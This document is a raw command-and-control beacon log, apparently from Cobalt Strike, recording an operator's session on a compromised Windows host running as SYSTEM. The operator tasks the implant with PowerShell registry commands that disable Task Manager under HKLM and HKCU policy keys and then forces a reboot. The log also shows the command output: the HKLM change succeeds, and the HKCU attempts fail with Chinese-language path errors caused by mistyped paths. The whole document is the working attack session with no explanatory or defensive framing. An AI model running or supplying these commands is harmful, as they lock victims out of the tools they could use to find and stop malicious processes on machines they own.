02/02 16:29:04 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 1620; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/02 16:33:22 [task] Tasked beacon to run: remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:33:22 [task] Tasked beacon to run: new-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
02/02 16:33:22 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\Software\MicrosoftWindows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:33:22 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
02/02 16:33:22 [task] Tasked beacon to run: remove-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr
02/02 16:33:22 [task] Tasked beacon to run: new-ItemProperty -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\GroupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001
02/02 16:33:22 [task] Tasked beacon to run: shutdown /r /f
02/02 16:34:01 [checkin] host called home, sent: 2835 bytes
02/02 16:34:03 [output]
received output:


PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Softwar
                 e\Microsoft\Windows\CurrentVersion\Policies\System
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Softwar
                 e\Microsoft\Windows\CurrentVersion\Policies
PSChildName    : System
PSDrive        : HKLM
PSProvider     : Microsoft.PowerShell.Core\Registry
DisableTaskMgr : 1





02/02 16:34:03 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\Policies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\Software\MicrosoftWindows\CurrentVersio_x000D__x000A_</S><S S="Error">n\Policies\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 16:34:03 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\P_x000D__x000A_</S><S S="Error">olicies\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\P_x000D__x000A_</S><S S="Error">olicies\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [New-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewIt _x000D__x000A_</S><S S="Error">   emPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 16:34:03 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Remove-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 20_x000D__x000A_</S><S S="Error">+ remove-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersio_x000D__x000A_</S><S S="Error">n\GroupPolicyObjects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Polici_x000D__x000A_</S><S S="Error">es\System -Name DisableTaskMgr_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [Remove-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.Remov _x000D__x000A_</S><S S="Error">   eItemPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

02/02 16:34:03 [output]
received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">New-ItemProperty : 找不到路径“HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\G_x000D__x000A_</S><S S="Error">roupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\S_x000D__x000A_</S><S S="Error">ystem”，因为该路径不存在。_x000D__x000A_</S><S S="Error">所在位置 行:1 字符: 17_x000D__x000A_</S><S S="Error">+ new-ItemProperty &lt;&lt;&lt;&lt;  -Path HKCU:\SoftwareMicrosoft\Windows\CurrentVersion\G_x000D__x000A_</S><S S="Error">roupPolicyObjects\LocalUser\SoftwareMicrosoft\Windows\CurrentVersion\Policies\S_x000D__x000A_</S><S S="Error">ystem -Name DisableTaskMgr -propertyType Dword -Value 0x00000001_x000D__x000A_</S><S S="Error">    + CategoryInfo          : ObjectNotFound: (HKCU:\SoftwareM...Policies\Syst _x000D__x000A_</S><S S="Error">   em:String) [New-ItemProperty], ItemNotFoundException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewIt _x000D__x000A_</S><S S="Error">   emPropertyCommand_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>

